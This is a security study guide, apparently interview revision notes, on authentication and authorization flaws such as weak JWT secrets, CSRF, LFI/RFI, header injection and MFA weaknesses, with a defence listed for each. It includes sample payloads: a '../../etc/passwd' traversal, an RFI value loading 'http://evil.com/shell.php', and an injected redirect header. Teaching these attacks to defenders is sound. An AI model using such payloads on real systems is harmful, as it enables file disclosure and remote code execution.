Authentication & Authorization Flaws – Block B (Intermediate)

In this block, the goal is to understand how attackers bypass authentication and authorization mechanisms and how to defend against them.

1. Weak JWT Secrets

What is it?

JWT (JSON Web Token) is used for stateless authentication.

If the signing secret is weak (e.g., password123), an attacker can brute-force it and forge valid tokens.


Why is JWT used?

Scalable (no server-side session storage)

Fast API authentication

Works well for microservices


Why preferred?

Easier to scale than server sessions.

But only if signed with a strong secret (or RSA/ECDSA keys).


How to defend

Strong random secrets (256-bit+)

Short expiry

Rotate keys

Verify signature and claims



---

2. Cross-Site Request Forgery (CSRF)

What is it? A victim is already logged in. The attacker tricks the victim's browser into sending an unwanted request.

Example:

Transfer ₹10,000

The browser automatically sends the victim's session cookie.

Why does it happen?

Browser automatically includes cookies.

Server trusts the cookie alone.


Protection

CSRF Tokens

SameSite Cookies

Origin/Referer validation


Why CSRF tokens? They prove the request came from your application's page—not an attacker's website.


---

3. File Inclusion Vulnerabilities

Two types:

Local File Inclusion (LFI)

Example:

page=../../etc/passwd

Attacker reads local files.


---

Remote File Inclusion (RFI)

Example:

page=http://evil.com/shell.php

Server executes malicious remote code.

Protection

Never trust file names from users.

Whitelist allowed files.

Disable remote includes.



---

4. Header Injection

HTTP headers are manipulated.

Example:

Instead of

Location: home

Attacker injects

Location: evil.com

or injects additional headers.

Risks

Response Splitting

Cache poisoning

Open Redirects


Protection

Validate inputs.

Encode special characters.

Never allow CR/LF injection.



---

5. Multi-Factor Authentication (MFA) Weaknesses

Common weaknesses:

SMS OTP interception

OTP reuse

Push notification fatigue

Backup codes leaked


Better MFA

Authenticator Apps

Hardware Security Keys (FIDO2)

Passkeys


Why preferred? Much harder to steal than SMS OTP.


---

Manager-style "Why?" Questions

Why JWT instead of Sessions?

Better scalability for distributed systems and APIs.


Why CSRF Tokens?

Cookies alone cannot prove the request originated from your application.


Why MFA?

Passwords can be stolen; MFA adds another independent factor.


Why validate headers?

Prevents response splitting, cache poisoning, and redirect attacks.


Why whitelist file access?

Prevents attackers from reading sensitive files or executing malicious code.



---

Quick Interview Revision

JWT → Stateless authentication token; secure only with strong signing keys.

CSRF → Tricks logged-in users into sending unwanted requests; prevent with CSRF tokens and SameSite cookies.

LFI/RFI → Abuse file inclusion to read files or execute code; prevent with whitelisting.

Header Injection → Manipulates HTTP headers; sanitize all header values.

MFA Weaknesses → SMS is weaker; authenticator apps and security keys are stronger.


